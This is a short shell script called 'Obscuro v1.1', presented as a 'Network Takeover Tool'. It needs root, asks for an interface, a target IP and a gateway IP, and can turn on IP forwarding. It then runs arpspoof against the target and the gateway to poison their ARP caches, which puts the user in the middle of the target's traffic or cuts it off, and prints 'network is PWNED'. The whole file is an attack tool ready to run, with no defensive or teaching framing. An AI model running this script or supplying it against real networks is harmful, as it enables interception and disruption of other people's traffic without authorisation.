#!/bin/sh

if [ "$(id -u)" -ne 0 ]; then
   echo "Obscuro has superpowers." 
   echo "You need to be root !"
   exit 1
fi
echo "\033[1;31m"
cat << "eof"
                       ▄▄█████████▄▄▄,
                    ▄█████████████████▀█⌐
                 ,▄██████████████████████
                ▄█▀████▀██████████████████
                █▄███▀▄███████████████████▄
                ███▄███████████████████████⌐
               ╚██▀█████▀▀▀▄▄▄▄▄███████▄▄█▀█
               ²██▀█▄▄█▀█▄▄; "▀▀███▀▀▀████ "
              ▄╝⌐ "╙'     `▀▀█▄         `└
              ██ ▄H       , ╓██▌          ⌐
  ▄           ▄█ █▄     ,▄▀,█"╙█▄        ██              ▄
  ╙█▄        ▄█╓█████████▄▄█   ╙██▄▄▄▄▄▄███▄          ,▄█▀
   ╙███▄    ▐██▌▀██████▀███⌐    ║█████████▀^        ▄███▀
    `█████▄▄║███╓     "█▄║██████████▀`          ▄▄█████`
      ▀█████║███║▌     ╙▀███████████⌐        ▄███████▀
        ▀███║██▀║█     ╚ ██▌█▀█▀█║▌Φ       ▄▀██████▀
          "▀║█▀▄██▌;      ╙⌐█▀█▀╙       ,A██████▀^
          ╓██▀╓███╓█▀▄               ,▄▀▄█████▀
          █▀ .███▌█████▀▄         ,▄▀██████▀
         ║^  ║███H`▀██████▀W▄  ╓▄▀██████▀
              ███     "▀██▀█▄▀██████▀└
               ██ ██▌ ,▄#▀██████▀█z≡▄, Φ██
               "▌ ██*██████▀▀  ╙▀██████▀██
            ,▄▄▄▄█M█▌▀▀└            "▀▀║█▐███▄▄,
       ,▄▄█████▀▀',██                  ██ '▀▀█████▄▄,
      ██▀▀▀└      ╙▀▀                  ▀▀┘      └▀▀▀██
      ██               Obscuro v1.1                 ██     
  Network Takeover Tool designed by: Emanuel Gjini
  E-mail: incognitus@tuta.io
eof

echo "\033[1;32m[*] --------------- OBSCURO v1.1 ---------------\033[0m"
echo -n "\033[1;34m[>] Chose one of the available interfaces:\n"
netstat -i | awk '!/Kernel|Iface/ { print $1}'
echo -n "\033[24;0m\033[1;32m[>] \033[37mInterface: \033[4;33m"
read i
echo -n "\033[24;0m\033[1;32m[>] \033[37mTarget IP: \033[4;33m"
read t
echo -n "\033[24;0m\033[1;32m[>] \033[37mGateway IP: \033[4;33m"
read g
echo -n "\033[24;0m\033[1;32m[>] \033[37mPassthrough mode y/n: \033[4;33m"
read f
if [ -n "$f" ] && [ -n "$i" ]
 then
    if [ "$f" = "y" ]
     then
      echo 1 > /proc/sys/net/ipv4/ip_forward
    elif [ "$f" = "n" ]
     then
      echo 0 > /proc/sys/net/ipv4/ip_forward
    else
      echo "\nInvalid parameter given"
      exit 1
    fi
 if [ -z "$t" ]
  then
   arpspoof -i $i $g 2>/dev/null
  else
   echo -n "\n\033[24;0m\033[1;31m[!] Obscuro...network is PWNED !\033[0m\n"
   echo -n "\033[37mCtrl+C to stop \033[0m\n"
   arpspoof -i $i -t $t $g 2> /dev/null
   arpspoof -i $i -t $g $t 2> /dev/null
 fi
 else
 echo "\nInvalid parameters given"
 exit 1
fi



